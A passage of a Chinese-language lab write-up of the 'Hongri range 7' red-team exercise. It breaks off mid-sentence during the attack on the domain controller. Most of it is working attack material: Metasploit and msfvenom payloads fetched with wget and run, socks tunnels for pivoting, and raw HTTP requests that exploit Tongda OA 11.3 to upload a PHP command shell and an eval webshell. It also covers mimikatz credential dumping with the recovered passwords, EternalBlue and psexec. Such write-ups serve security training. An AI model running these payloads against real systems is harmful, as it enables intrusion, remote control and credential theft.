<p>\u6210\u529f\u63d0\u6743\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u8be5\u5c06\u8fd9\u4e24\u53f0\u673a\u5668\u4e0a\u7ebfMSF\u7ee7\u7eed\u8fdb\u653b\u5185\u7f51\u4e86</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_6","title":"\u5185\u7f51\u6e17\u900f","text":"<p>\u81f3\u6b64\u5df2\u7ecf\u62ff\u4e0b\u4e24\u53f0linux\u4e3b\u673a . ubuntu1 \u548c ubuntu2 \u6574\u7406\u4e00\u4e0b</p> <pre><code>ubuntu1\n    ip\uff1a192.168.111.133  192.168.52.10\n\nubuntu2\n    ip\uff1a192.168.52.20 192.168.93.10\n</code></pre> <p>\u5148\u8fdb\u884c\u4e0a\u7ebf\u901a\u8fc7Redis\u62ff\u5230\u7684\u673a\u5668(Web1)</p> <pre><code>msfconsole \nuse exploit/multi/script/web_delivery           \nset target 7    # \u9009\u62e9\u76ee\u6807\u7cfb\u7edf            \nset payload linux/x64/meterpreter/reverse_tcp            \nset lhost 192.168.111.128           \nset lport 2345   \nset SRVPORT 8081\nrun\n</code></pre> <p></p> <p>\u6dfb\u52a0\u8def\u7531(\u8fd9\u4e00\u6b65\u975e\u5e38\u5173\u952e)</p> <pre><code>run get_local_subnets  //\u8fd9\u4e2a\u547d\u4ee4\u7528\u6765\u8bc6\u522b\u5e76\u83b7\u53d6\u672c\u5730\u4e3b\u673a\u4e0a\u53ef\u7528\u7684\u5b50\u7f51\u4fe1\u606f,\u5b83\u4f1a\u5217\u51fa\u5f53\u524d\u7cfb\u7edf\u7684\u7f51\u7edc\u63a5\u53e3\u4e2d\u6240\u6709\u53ef\u8bbf\u95ee\u7684\u5b50\u7f51\nrun autoroute -s 192.168.52.0 -n 255.255.255.0  //\u5141\u8bb8Metasploit\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u81ea\u52a8\u6dfb\u52a0\u65b0\u7684\u8def\u7531\uff0c\u6307\u5b9a\u53ef\u4ee5\u901a\u8fc7\u76ee\u6807\u4e3b\u673a\u8bbf\u95ee\u7684\u7f51\u7edc\nrun autoroute -p   //\u663e\u793a\u5f53\u524dMetasploit\u4e2d\u7684\u8def\u7531\u8868\uff0c\u5217\u51fa\u6240\u6709\u53ef\u7528\u7684\u8def\u7531\u4fe1\u606f\n</code></pre> <p></p> <p>\u56e0\u4e3a\u5728Web 1\u8fd9\u53f0\u673a\u5668\u4e0a\u901a\u8fc7\u5c1d\u8bd5\u8be5\u673a\u5668\u5b89\u88c5\u6709python3.6.9\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u6728\u9a6c\u4e0a\u4f20\u5230Web 1\uff0c\u901a\u8fc7python3\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u4f7f\u7528Web 2\u8fdb\u884c\u4e0b\u8f7d\u5e76\u8fd0\u884c\u6211\u4eec\u7684\u6728\u9a6c</p> <p></p> <p>\u9996\u5148MSF\u751f\u6210\u6728\u9a6c\uff0c\u901a\u8fc7MSF\u4e0a\u4f20\u5230Web 1\u4e2d</p> <pre><code>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=2020 -f elf -o 20.elf\nsessions 1\nupload /home/tom/20.elf /tmp/20.elf\n</code></pre> <p></p> <pre><code>root@ubuntu:/tmp# python3 -m http.server\n------------------------------------------------------------------------------------------------------------\nbash-4.3# wget http://192.168.52.10:8000/20.elf;chmod +x 20.elf;./20.elf\n-------------------------------------------------------------------------------------------------------------\nmsf6 exploit(multi/script/web_delivery) &gt; use multi/handler\nmsf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp\npayload =&gt; linux/x64/meterpreter/bind_tcp\nmsf6 exploit(multi/handler) &gt; show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (linux/x64/meterpreter/bind_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LPORT  2020             yes       The listen port\n   RHOST  192.168.52.20    no        The target address\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/handler) &gt; exploit\n</code></pre> <p></p> <p></p> <p>\u6210\u529f\u4e0a\u7ebf192.168.52.20(web2).</p> <p>\u76ee\u524d\u62ff\u4e0b\u4e86web1\u548cweb2</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#socks5","title":"\u8def\u7531\u4e0esocks5\u4ee3\u7406","text":"<p>\u6211\u4eec\u83b7\u53d6\u4e86\u4e24\u4e2asessions\uff0c\u56e0\u4e3akali\u65e0\u6cd5\u4e0e52\u6bb5\u7684\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728web1\u4e0a\u589e\u52a0\u4e00\u6761\u53bb\u5f80192.168.52.0\u7684\u8def\u7531</p> <p></p> <p>\u8def\u7531\u8f6c\u53d1\u53ea\u80fd\u5c06msfconsole\u5e26\u8fdb\u5185\u7f51\uff0c\u800c\u8981\u60f3\u5c06\u653b\u51fb\u673a\u4e0a\u7684\u5176\u4ed6\u653b\u51fb\u7a0b\u5e8f\u4e5f\u5e26\u8fdb\u5185\u7f51\u8fd8\u9700\u8981\u642d\u5efasocks\u4ee3\u7406\u3002\u6211\u4eec\u4f7f\u7528earthworm\u642d\u5efasocks5\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u3002</p> <p>\u5728\u653b\u51fb\u673a\u4e0a\u6267\u884c\u5982\u4e0b\uff1a</p> <pre><code>./ew_for_linux64 -s rcsocks -l 2080 -e 5678\n</code></pre> <p></p> <p>\u5728DMZ\u533a\u57df\u7684Web1\u4e0a\u4f20ew_for_linux64\uff0c\u901a\u8fc7\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5b9e\u73b0\uff1a</p> <pre><code>sessions 1\nupload /home/tom/ew_for_linux64 /tmp/ew_for_linux64\nnohup ./ew_for_linux64 -s rssocks -d 192.168.111.128 -e 5678\n</code></pre> <p></p> <p></p> <p>\u914d\u7f6e\u6210\u529f\uff1a</p> <p></p> <p>\u7136\u540e\u914d\u7f6eproxychains\uff0c\u5c06socks5\u670d\u52a1\u5668\u6307\u5411127.0.0.1:2080\uff0c\u4e4b\u540e\u4fbf\u53ef\u4ee5\u4f7f\u7528proxychains\u5c06\u6211\u4eec\u653b\u51fb\u673a\u4e0a\u7684\u7a0b\u5e8f\u4ee3\u7406\u8fdb\u7b2c\u4e8c\u5c42\u7f51\u7edc\uff08192.168.52.1/24\uff09\u4e86\u3002</p> <pre><code>vim /etc/proxychains4.conf   \nsocks5 127.0.0.1 2080\n</code></pre> <p></p> <p>\u63a5\u7740\uff0c\u6211\u4eec\u4f7f\u7528metasploit\u7684 auxiliary/scanner/discovery/udp_probe \u6a21\u5757\u6765\u626b\u63cf\u7b2c\u4e8c\u5c42\u7f51\u7edc\u4e2d\u7684\u4e3b\u673a\u5b58\u6d3b\uff1a</p> <pre><code>use auxiliary/scanner/discovery/udp_probe\nset rhosts 192.168.52.1-254            //\u6ce8\u610f\u5fc5\u987b\u662f254\uff0c\u4e0d\u80fd\u662f255\nset threads 5\nrun\n</code></pre> <p>192.168.52.255 \u662f\u5e7f\u64ad\u5730\u5740\uff0c\u4e0d\u662f\u5355\u4e2a\u4e3b\u673a\u7684 IP\uff0c\u5e7f\u64ad\u5730\u5740\u7528\u4e8e\u5c06\u6570\u636e\u5305\u53d1\u9001\u7ed9\u5b50\u7f51\u4e2d\u7684\u6240\u6709\u8bbe\u5907\uff0c\u901a\u5e38\u4e0d\u7528\u4e8e\u5355\u72ec\u7684\u901a\u4fe1\u3002\u4e00\u4e9b\u5de5\u5177\uff08\u5305\u62ec Metasploit\uff09\u5728\u626b\u63cf\u65f6\u4f1a\u5c1d\u8bd5\u5bf9\u6574\u4e2a IP \u8303\u56f4\u53d1\u9001\u63a2\u6d4b\u8bf7\u6c42\uff0c\u800c\u5bf9\u5e7f\u64ad\u5730\u5740\u53d1\u9001\u7684\u8bf7\u6c42\u901a\u5e38\u65e0\u6548\u6216\u88ab\u963b\u6b62\u3002</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u4e8630\u4e3b\u673a\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u4f7f\u7528proxychains4 \u8fdb\u4e00\u6b65\u5bf930\u4e3b\u673a\u7684\u7aef\u53e3\u8fdb\u884c\u626b\u63cf</p> <pre><code>proxychains4  -f /etc/proxychains4.conf nmap -Pn -sT -sV -F -O 192.168.52.30\n</code></pre> <p>\u4f7f\u7528<code>proxychains4   nmap -Pn -sT -sV -F -O 192.168.52.30</code>\u4f1a\u5931\u8d25\uff0c\u5e76\u4e14\u663e\u793a\u4f7f\u7528\u7684\u662f1080\u7aef\u53e3\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u6211\u4eec\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\u5c31\u4e0d\u4f1a\u62a5\u9519\u4e86\u3002</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u4e868080\u7aef\u53e3\u4e0a\u6709\u4e00\u4e2anginx\u7684http\u670d\u52a1\uff0c\u5728\u653b\u51fb\u673a\u7684\u6d4f\u89c8\u5668\u4e0a\u8bbe\u7f6e\u597d\u4ee3\u7406\u540e\uff0c\u6210\u529f\u8bbf\u95ee\uff1a</p> <p></p> <p>\u5728kali\u4e0a \u8bbf\u95ee192.168.52.30:8080</p> <p></p> <p>\u662f\u4e2a\u901a\u8fbeOA\uff0c\u7ecf\u6d4b\u8bd5\u5176\u7248\u672c\u4e3a\u901a\u8fbeOA V11.3\uff0c\u8be5\u7248\u672c\u5b58\u5728\u4efb\u610f\u7528\u6237\u767b\u5f55\u3001\u6587\u4ef6\u5305\u542b\u548c\u6587\u4ef6\u4e0a\u4f20\u7b49\u591a\u4e2a\u6f0f\u6d1e\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u4e0b\u8f7d\u4e00\u4e2a\u4ee3\u7406\u63d2\u4ef6\uff0c\u914d\u7f6e\u597d\u4ee3\u7406\uff0c\u597d\u8ba9\u6211\u4eec\u65b9\u4fbf\u4f7f\u7528burpsuite\u8fdb\u884c\u6293\u5305\uff0c</p> <p></p> <p>\u7531\u4e8e\u5176\u4ed6\u7aef\u53e3\u7684\u5360\u7528\uff0c\u8fd9\u91cc\u4f7f\u75288089.</p> <p>burpsuite\u8981\u914d\u7f6e\u4e24\u4e2a\u5730\u65b9\uff1a</p> <p></p> <p></p> <p>\u914d\u597d\u540e\u6253\u5f00\u4ee3\u7406\uff0c\u8fdb\u884c\u6293\u5305\uff0c\u53d1\u73b0\u6293\u5305\u6210\u529f\uff0c\u76f4\u63a5\u6293\u5305\uff0c\u4fee\u6539\uff0c\u672a\u6388\u6743\u4e0a\u4f20\u56fe\u7247\u9a6c </p> <pre><code>POST /ispirit/im/upload.php HTTP/1.1\nHost: 192.168.52.30:8080\nContent-Length: 658\nCache-Control: no-cache\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5\nCookie: PHPSESSID=123\nConnection: close\n\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\n\n2\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"P\"\n\n123\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"DEST_UID\"\n\n1\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\nContent-Type: image/jpeg\n\n&lt;?php\n$command=$_POST['cmd'];\n$wsh = new COM('WScript.shell');\n$exec = $wsh-&gt;exec(\"cmd /c \".$command);\n$stdout = $exec-&gt;StdOut();\n$stroutput = $stdout-&gt;ReadAll();\necho $stroutput;\n?&gt;\n------WebKitFormBoundarypyfBh1YB4pV8McGB--\n</code></pre> <p></p> <p>\u6587\u4ef6\u5305\u542b\uff1a</p> <pre><code>POST /ispirit/interface/gateway.php HTTP/1.1\nHost: 192.168.52.30:8080\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.21.0\nContent-Length: 71\nContent-Type: application/x-www-form-urlencoded\n\njson={\"url\":\"/general/../../attach/im/2409/731126929.jpg\"}&amp;cmd=whoami\n</code></pre> <p></p> <pre><code>POST /ispirit/interface/gateway.php HTTP/1.1\nHost: 192.168.52.30:8080\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.21.0\nContent-Length: 72\nContent-Type: application/x-www-form-urlencoded\n\njson={\"url\":\"/general/../../attach/im/2409/1329251649.jpg\"}&amp;cmd=whoami\n</code></pre> <p></p> <p>\u5199\u5165\u6728\u9a6c</p> <p></p> <pre><code>&lt;?php fputs(fopen('../../shell.php','w'),'&lt;?php @eval($_POST[\"test\"])?&gt;');?&gt;\n</code></pre> <p>\u8681\u5251\u8fde\u63a5</p> <p></p> <p>\u76f4\u63a5\u4e0a\u4f20msf\u7684shell\u8fdb\u884c\u8fde\u63a5</p> <pre><code>msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe &gt; msf.exe\nuse exploit/multi/handler \nset payload windows/meterpreter/bind_tcp\nset rhosts 192.168.52.30\nset lport 4444\n</code></pre> <p></p> <p>\u4e0a\u7ebfpc1</p> <p></p> <p>\u81f3\u6b64\uff0c\u7b2c\u4e00\u5c42\u5185\u7f51\u4e2d\u7684\u4e3b\u673a\u5168\u90e8\u7edf\u4e00\u5230\u4e86kali\u4e2d</p> <p></p> <p>\u6b64\u65f6\uff0c\u7ed8\u5236\u51fa\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_7","title":"\u5185\u7f51\u4fe1\u606f\u6536\u96c6","text":"<p>\u62ff\u4e0b\u7b2c\u4e8c\u5c42\u7f51\u7edc\u4e2d\u7684Windows 7\u670d\u52a1\u5668\u540e\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u76ee\u6807\u5185\u7f51\u73af\u5883\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u5bf9\u76ee\u6807\u7f51\u7edc\u6709\u4e00\u4e2a\u521d\u6b65\u7684\u4e86\u89e3:</p> <pre><code>ipconfig /all   # \u67e5\u770b\u672c\u673aip\uff0c\u6240\u5728\u57df\nsysteminfo      # \u5217\u51fa\u7cfb\u7edf\u4fe1\u606f\nroute print     # \u6253\u5370\u8def\u7531\u4fe1\u606f\nnet view        # \u67e5\u770b\u5c40\u57df\u7f51\u5185\u5176\u4ed6\u4e3b\u673a\u540d\narp -a          # \u67e5\u770barp\u7f13\u5b58\nwhoami\nnet start       # \u67e5\u770b\u5f00\u542f\u4e86\u54ea\u4e9b\u670d\u52a1\nnet share       # \u67e5\u770b\u5f00\u542f\u4e86\u54ea\u4e9b\u5171\u4eab\n\nnet config workstation   # \u67e5\u770b\u8ba1\u7b97\u673a\u540d\u3001\u5168\u540d\u3001\u7528\u6237\u540d\u3001\u7cfb\u7edf\u7248\u672c\u3001\u5de5\u4f5c\u7ad9\u3001\u57df\u3001\u767b\u5f55\u57df\nnet user                 # \u67e5\u770b\u672c\u673a\u7528\u6237\u5217\u8868\nnet user /domain         # \u67e5\u770b\u57df\u7528\u6237\nnet localgroup administrators   # \u67e5\u770b\u672c\u5730\u7ba1\u7406\u5458\u7ec4\uff08\u901a\u5e38\u4f1a\u6709\u57df\u7528\u6237\uff09\nnet view /domain         # \u67e5\u770b\u6709\u51e0\u4e2a\u57df\nnet user \u7528\u6237\u540d /domain   # \u83b7\u53d6\u6307\u5b9a\u57df\u7528\u6237\u7684\u4fe1\u606f\nnet group /domain        # \u67e5\u770b\u57df\u91cc\u9762\u7684\u5de5\u4f5c\u7ec4\uff0c\u67e5\u770b\u628a\u7528\u6237\u5206\u4e86\u591a\u5c11\u7ec4\uff08\u53ea\u80fd\u5728\u57df\u63a7\u4e0a\u64cd\u4f5c\uff09\nnet group \u7ec4\u540d /domain    # \u67e5\u770b\u57df\u4e2d\u67d0\u5de5\u4f5c\u7ec4\nnet group \"domain admins\" /domain  # \u67e5\u770b\u57df\u7ba1\u7406\u5458\u7684\u540d\u5b57\nnet group \"domain computers\" /domain  # \u67e5\u770b\u57df\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u540d\nnet group \"domain controllers\" /domain  # \u67e5\u770b\u57df\u63a7\u5236\u5668\uff08\u53ef\u80fd\u6709\u591a\u53f0\uff09\n</code></pre> <p>\u53ef\u77e5\u76ee\u6807\u7f51\u7edc\u73af\u5883\u5b58\u5728\u4e00\u4e2a\u540d\u4e3awhoamianony.org\u7684\u57df\u73af\u5883\uff0c\u57df\u63a7\u5236\u5668\u4e3b\u673a\u540d\u4e3aDC.whoamianony.org\uff0cIP\u4e3a192.168.93.30\uff0c\u57df\u7ba1\u7406\u5458\u4e3aAdministrator\u3002</p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_8","title":"\u6293\u53d6\u57df\u7528\u6237\u5bc6\u7801","text":"<p>\u63a5\u7740\uff0c\u6211\u4eec\u4f7f\u7528meterpreter\u4e0a\u7684kiwi\u6a21\u5757\u5c1d\u8bd5\u6293\u53d6\u57df\u7528\u6237\u53ca\u57df\u7ba1\u7406\u5458\u7684\u5bc6\u7801\uff1a</p> <p>\u5728 Meterpreter \u4e2d\uff0cmigrate \u547d\u4ee4\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u5c06\u5f53\u524d\u7684 Meterpreter \u4f1a\u8bdd\u4ece\u4e00\u4e2a\u8fdb\u7a0b\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u4e2a\u529f\u80fd\u5bf9\u4e8e\u4fdd\u6301\u9690\u853d\u6027\u3001\u7a33\u5b9a\u6027\u548c\u6301\u4e45\u6027\u6709\u91cd\u8981\u610f\u4e49\u3002\u5177\u4f53\u4f5c\u7528\u5305\u62ec\uff1a</p> <p>\u4fdd\u6301\u4f1a\u8bdd\u7a33\u5b9a\u6027\uff1a\u4e00\u4e9b\u76ee\u6807\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u5728\u77ed\u65f6\u95f4\u5185\u9000\u51fa\u6216\u5d29\u6e83\uff0c\u8fc1\u79fb\u5230\u66f4\u7a33\u5b9a\u7684\u8fdb\u7a0b\uff08\u4f8b\u5982\u7cfb\u7edf\u670d\u52a1\u8fdb\u7a0b\uff09\u80fd\u591f\u786e\u4fdd Meterpreter \u4f1a\u8bdd\u4e0d\u4f1a\u4e2d\u65ad\uff0c\u4ece\u800c\u7ef4\u6301\u8fdc\u7a0b\u63a7\u5236\u3002</p> <p>\u63d0\u5347\u6743\u9650\uff1a\u5982\u679c Meterpreter \u4f1a\u8bdd\u662f\u5728\u4e00\u4e2a\u6743\u9650\u8f83\u4f4e\u7684\u8fdb\u7a0b\u4e2d\u542f\u52a8\u7684\uff0c\u8fc1\u79fb\u5230\u4e00\u4e2a\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\uff08\u4f8b\u5982\u7cfb\u7edf\u7ea7\u8fdb\u7a0b\uff09\u53ef\u4ee5\u83b7\u5f97\u66f4\u9ad8\u7684\u6743\u9650\uff0c\u4fbf\u4e8e\u6267\u884c\u66f4\u9ad8\u7ea7\u7684\u64cd\u4f5c\u3002</p> <p>\u9690\u853d\u6027\uff1a\u5c06\u4f1a\u8bdd\u8fc1\u79fb\u5230\u4e00\u4e2a\u5e38\u9a7b\u4e14\u5408\u6cd5\u7684\u7cfb\u7edf\u8fdb\u7a0b\uff08\u4f8b\u5982 explorer.exe \u6216 svchost.exe\uff09\u53ef\u4ee5\u5e2e\u52a9\u907f\u514d\u88ab\u53d1\u73b0\u6216\u7ec8\u6b62\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u8fdb\u7a0b\u901a\u5e38\u4e0d\u4f1a\u5f15\u8d77\u7cfb\u7edf\u7ba1\u7406\u5458\u7684\u6ce8\u610f\u3002</p> <p>\u907f\u514d\u8fdb\u7a0b\u7ec8\u6b62\uff1a\u67d0\u4e9b\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u6216\u7cfb\u7edf\u76d1\u63a7\u5de5\u5177\u53ef\u80fd\u4f1a\u6807\u8bb0\u548c\u7ec8\u6b62\u4e00\u4e9b\u975e\u6807\u51c6\u7684\u6216\u53ef\u7591\u7684\u8fdb\u7a0b\uff0c\u8fc1\u79fb\u5230\u7cfb\u7edf\u5173\u952e\u8fdb\u7a0b\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u907f\u514d\u88ab\u8f7b\u6613\u68c0\u6d4b\u5230\u3002</p> <pre><code>load kiwi\nmigrate n     // (n\u6307\u7684\u662f\u8fdb\u7a0b\u53f7)\nkiwi_cmd privilege::debug\nkiwi_cmd sekurlsa::logonPasswords\n</code></pre> <p></p> <p>\u6210\u529f\u6293\u53d6\u5230\u57df\u7528\u6237bunny\u548c\u57df\u7ba1\u7406\u5458administrator\u7684\u51ed\u8bc1\uff1a</p> <pre><code>bunny\uff1aBunny2021\nadministrator\uff1aWhoami2021\n</code></pre>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_9","title":"\u7b2c\u4e09\u5c42\u7f51\u7edc\u6e17\u900f","text":"<p>\u73b0\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edc\u5df2\u7ecf\u6e17\u900f\u5b8c\u4e86\uff0c\u6211\u4eec\u7ee7\u7eed\u5165\u4fb5\u7b2c\u4e09\u5c42\u7f51\u7edc\uff08192.168.93.1/24\uff09\u3002\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edcWindows\u670d\u52a1\u5668\u7684meterpreter\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u901a\u5f80192.168.93.1/24\u7f51\u6bb5\u7684\u8def\u7531\uff1a</p> <pre><code>msf6 exploit(multi/handler) &gt; route add 192.168.93.0 255.255.255.0 4                                                                                                                               \n[*] Route added                                                                                                                                                                                    \nmsf6 exploit(multi/handler) &gt; route print                                                                                                                                                          \n\nIPv4 Active Routing Table                                                                                                                                                                          \n=========================                                                                                                                                                                          \n\n   Subnet             Netmask            Gateway                                                                                                                                                   \n   ------             -------            -------                                                                                                                                                   \n   192.168.52.0       255.255.255.0      Session 1                                                                                                                                                 \n   192.168.93.0       255.255.255.0      Session 4                                                                                                                                                 \n\n[*] There are currently no IPv6 routes defined.\n</code></pre> <p>\u8def\u7531\u8f6c\u53d1\u53ea\u80fd\u5c06msfconsole\u5e26\u8fdb\u5185\u7f51\uff0c\u800c\u8981\u60f3\u5c06\u653b\u51fb\u673a\u4e0a\u7684\u5176\u4ed6\u653b\u51fb\u7a0b\u5e8f\u4e5f\u5e26\u8fdb\u5185\u7f51\u8fd8\u9700\u8981\u642d\u5efasocks\u4ee3\u7406\u3002\u6211\u4eec\u4f7f\u7528earthworm\u642d\u5efa\u4e00\u4e2a\u4e8c\u7ea7socks5\u4ee3\u7406\u670d\u52a1\u3002</p> <p>\u9996\u5148\u653b\u51fb\u673a\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u6dfb\u52a0\u4e00\u4e2a\u8f6c\u63a5\u96a7\u9053\uff0c\u76d1\u542c1090\u7aef\u53e3\uff0c\u5e76\u5c061090\u7aef\u53e3\u6536\u5230\u7684\u4ee3\u7406\u8bf7\u6c42\u53d1\u9001\u7ed91235\u7aef\u53e3\uff0c\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>./ew_for_linux64 -s lcx_listen -l 1090 -e 1235\n</code></pre> <p></p> <p>\u7136\u540e\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edc\u7684Windows\u670d\u52a1\u5668\u4e0a\u4f20ew_for_Win.exe\uff0c\u5e76\u5229\u7528ssocksd\u65b9\u5f0f\u542f\u52a8999\u7aef\u53e3\u7684\u6b63\u5411socks\u4ee3\u7406\uff0c\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>msf6 exploit(multi/handler) &gt; sessions 4\nmeterpreter &gt; upload /home/tom/ew_for_Win.exe C:\\\\Windows\\\\ew_for_Win.exe\new_for_Win.exe -s ssocksd -l 999\n</code></pre> <p></p> <p>\u6700\u540e\uff0c\u5728DMZ\u533a\u57df\u7684Ubuntu 18\u4e0a\u4f20ew_for_linux64\u5e76\u5229\u7528lcx_slave\u65b9\u5f0f\uff0c\u5c06\u653b\u51fb\u673a\u76841235\u7aef\u53e3\u4e0e\u7b2c\u4e8c\u5c42\u7f51\u7edcWindows 7\u7684999\u7aef\u53e3\u8fde\u63a5\u8d77\u6765\uff0c\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>./ew_for_linux64 -s lcx_slave -d 192.168.111.128 -e 1235 -f 192.168.52.30 -g 999\n</code></pre> <p></p> <p>\u7136\u540e\u914d\u7f6eproxychains\uff1a</p> <p></p> <p>\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6eproxychains\u7b49\u4ee3\u7406\u5de5\u5177\uff0c\u901a\u8fc7\u8bbf\u95ee\u653b\u51fb\u673a\u76841090\u7aef\u53e3\u6765\u4f7f\u7528\u67b6\u8bbe\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edcWindows\u4e3b\u673a\u4e0a\u7684socks\u4ee3\u7406\u670d\u52a1\uff0c\u6765\u8fdb\u5165\u7b2c\u4e09\u5c42\u7f51\u7edc\u4e86\u3002</p> <p>\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edcWindows\u4e3b\u673a\u4e0a\u6267\u884cping\u547d\u4ee4\u626b\u63cf\u7b2c\u4e09\u5c42\u7f51\u7edc\u4e2d</p> <p>\u63a5\u7740\uff0c\u6211\u4eec\u4f7f\u7528metasploit\u7684<code>auxiliary/scanner/smb/smb_version</code> \u6a21\u5757\uff08\u53ef\u7528\u6765\u63a2\u6d4bWindows\u4e3b\u673a\u5b58\u6d3b\uff09\u6765\u626b\u63cf\u7b2c\u4e09\u5c42\u7f51\u7edc\u4e2d\u7684\u4e3b\u673a\u5b58\u6d3b\uff1a</p> <pre><code>use auxiliary/scanner/smb/smb_version\nset rhosts 192.168.93.1-255\nset threads 5\nrun\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u53d1\u73b0\u7b2c\u4e09\u5c42\u7f51\u7edc\u4e2d\u8fd8\u6709\u4e24\u4e2aWindows\u4e3b\u673a\uff0c\u5206\u522b\u4e3aDC\uff08192.168.93.30\uff09\u548cPC2\uff08192.168.93.40\uff09\uff0c\u4f7f\u7528nmap\u8fdb\u4e00\u6b65\u626b\u63cfPC2\u4e3b\u673a\u4fe1\u606f\uff1a</p> <pre><code>proxychains4 nmap -Pn -sT -sV 192.168.52.40\n</code></pre> <p>\u6ca1\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u670d\u52a1\uff0c\u6211\u4eec\u76f4\u63a5\u6253\u4e00\u4e2a\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u8bd5\u8bd5\uff1a</p> <pre><code>setg Proxies socks5:127.0.0.1:1090\nuse exploit/windows/smb/ms17_010_eternalblue\nset rhosts 192.168.93.40\nset payload windows/x64/meterpreter/bind_tcp\nset rhost 192.168.93.40\nset lport 4444\nexploit\n</code></pre> <p>\u7b2c\u56db\u53f0\u9776\u673a\u62ff\u4e0b.</p> <p>\u6b64\u65f6\uff0c\u7ed8\u5236\u51fa\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"CTF/HTB/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html#_10","title":"\u8fdb\u653b\u57df\u63a7","text":"<p>\u73b0\u5728\u5c31\u5269\u4e0b\u57df\u63a7\u5236\u5668DC\u4e86\u3002\u65e2\u7136\u90fd\u6293\u53d6\u5230\u57df\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u4e86\uff0c\u90a3\u6211\u4eec\u76f4\u63a5psexec\u767b\u9646\u5c31\u5f97\u4e86\uff1a</p> <pre><code>use exploit/windows/smb/psexec\nset rhosts 192.168.93.30\nset SMBUser administrator\nset SMBPass Whoami2021\nset payload windows/meterpreter/bind_tcp\nset rhost 192.168.93.30\nrun\n</code></pre> <p></p> <p>\u5931\u8d25\u4e86\uff0c\u5e94\u8be5\u662f\u5f00\u4e86\u9632\u706b\u5899\u7684\u539f\u56e0\u3002</p> <p>\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u57df\u63a7\u7684\u5bc6\u7801\u4e86\uff0c\u5c31\u53ef\u4ee5\u63a7\u5236\u7b2c\u4e8c\u5c42\u7f51\u7edc\u7684Windows 